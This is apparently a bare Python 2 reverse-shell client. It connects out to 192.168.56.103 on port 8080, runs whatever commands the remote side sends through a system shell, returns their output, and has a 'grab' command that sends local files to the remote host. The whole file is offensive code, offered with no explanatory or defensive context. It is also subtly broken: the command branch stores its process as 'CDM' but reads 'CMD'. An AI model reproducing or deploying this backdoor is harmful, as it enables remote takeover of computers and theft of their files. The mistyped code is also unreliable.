import subprocess, socket, os

def transfer(s,path):
	if os.path.exists(path):
		fd = open(path, 'rb')
		packet = fd.read(1024)

		while packet != '':
			s.send(packet)
			packet = fd.read(1024)
		s.send('DONE')
		fd.close()
	else:
		s.send('Unable to find the file')

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.56.103', 8080))
	while True:
		command = s.recv(1024)
		if 'terminate' in command:
			s.close()
			break

		elif 'grab' in command:
			grab,path = command.split('*')
			try:
				transfer(s,path)
			except Exception, e:
				s.send(str(e))
				pass
		else:
			CDM = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
			s.send( CMD.stdout.read() )
			s.send( CMD.stderr.read() )

if __name__ == '__main__':
	connect()